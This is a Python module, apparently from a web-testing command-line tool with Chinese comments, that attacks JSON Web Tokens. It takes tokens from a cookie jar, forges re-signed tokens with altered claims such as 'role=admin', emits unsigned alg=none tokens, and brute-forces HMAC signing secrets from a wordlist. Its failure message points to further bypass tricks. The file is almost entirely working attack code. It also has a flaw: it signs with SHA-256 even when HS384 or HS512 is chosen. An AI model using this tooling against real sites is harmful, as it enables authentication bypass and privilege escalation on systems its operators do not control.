"""jwt —— 解 / 改签 / 爆破。令牌可以直接给，也可以从 cookie jar 里取。"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
import urllib.parse

from ..core.session import Session


def b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def token_from_args(args) -> str:
    if getattr(args, "token", None):
        return args.token
    if not getattr(args, "base", None):
        raise SystemExit("[!] 要么给令牌，要么给 --base 从 cookie jar 里取")
    sess = Session(base=args.base, jar_name=getattr(args, "jar", None))
    name = getattr(args, "name", None) or "token"
    for c in sess.jar:
        if c.name == name:
            return c.value
    raise SystemExit(f"[!] jar 里没有 cookie {name}（webctl cookie list --base {args.base} 看全部）")


def do_decode(args) -> int:
    tok = token_from_args(args)
    parts = tok.split(".")
    for label, seg in zip(("header", "payload"), parts[:2]):
        try:
            print(f"{label}: {json.dumps(json.loads(b64d(seg)), ensure_ascii=False, indent=2)}")
        except Exception:
            print(f"{label}: <不是合法 base64url/JSON> {seg}")
    print(f"signature: {parts[2] if len(parts) > 2 else '<无>'}")
    if len(parts) > 1:
        try:
            pay = json.loads(b64d(parts[1]))
            if "exp" in pay:
                left = pay["exp"] - int(time.time())
                print(f"[有效期] exp={pay['exp']} 剩余 {left}s" + ("（已过期，改签时记得 --exp）" if left < 0 else ""))
        except Exception:
            pass
    return 0


def do_sign(args) -> int:
    tok = token_from_args(args)
    h, p, _ = (tok.split(".") + ["", ""])[:3]
    head = json.loads(b64d(h))
    pay = json.loads(b64d(p))
    for kv in args.set or []:
        k, _, v = kv.partition("=")
        try:
            v = json.loads(v)
        except Exception:
            pass
        pay[k] = v
    if args.exp:
        pay["exp"] = int(time.time()) + int(args.exp)
    if args.alg.lower() == "none":
        new = f"{b64e(json.dumps({'alg': 'none', 'typ': 'JWT'}, separators=(',', ':')).encode())}." \
              f"{b64e(json.dumps(pay, separators=(',', ':')).encode())}."
    else:
        head["alg"] = args.alg
        nh = b64e(json.dumps(head, separators=(",", ":")).encode())
        np_ = b64e(json.dumps(pay, separators=(",", ":")).encode())
        if not args.secret:
            raise SystemExit("[!] HS* 需要 --secret（或先用 jwt crack 爆出来）")
        sig = hmac.new(args.secret.encode(), f"{nh}.{np_}".encode(), hashlib.sha256).digest()
        new = f"{nh}.{np_}.{b64e(sig)}"
    print(new)
    if args.print_payload:
        print(json.dumps(pay, ensure_ascii=False), file=__import__("sys").stderr)
    return 0


def do_crack(args) -> int:
    tok = token_from_args(args)
    h, p, s = tok.split(".")[:3]
    msg = f"{h}.{p}".encode()
    algs = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    n = 0
    for line in open(args.wordlist, encoding="utf-8", errors="replace"):
        w = line.strip()
        if not w:
            continue
        n += 1
        for name, hf in algs.items():
            if b64e(hmac.new(w.encode(), msg, hf).digest()) == s:
                print(f"[+] secret = {w}   (alg={name}, 试了 {n} 个)")
                return 0
    print(f"[-] 没爆出来（试了 {n} 个）。下一步：试 alg=none、HS/RS 混用、或去源码/前端找密钥")
    return 1


def register(sub) -> None:
    p = sub.add_parser("jwt", help="JWT：解码 / 改签 / 爆破密钥")
    v = p.add_subparsers(dest="jcmd", required=True)

    for name, fn in (("decode", do_decode), ("sign", do_sign), ("crack", do_crack)):
        sp = v.add_parser(name)
        sp.add_argument("token", nargs="?", help="JWT（或用 --base + --name 从 cookie 取）")
        sp.add_argument("--base", help="站点地址：从该 host 的 cookie jar 里取令牌")
        sp.add_argument("--name", default="token", help="cookie 名（默认 token，常见还有 credential/session）")
        sp.add_argument("--jar", help="用哪份 jar")
        if name == "sign":
            sp.add_argument("--secret", help="签名密钥")
            sp.add_argument("--set", action="append", help="改 payload，如 --set role=admin")
            sp.add_argument("--exp", type=int, help="重设有效期（秒后过期）")
            sp.add_argument("--alg", default="HS256", help="HS256/HS384/HS512/none")
            sp.add_argument("--print-payload", action="store_true")
        if name == "crack":
            sp.add_argument("-w", "--wordlist", required=True)
        sp.set_defaults(func=fn)
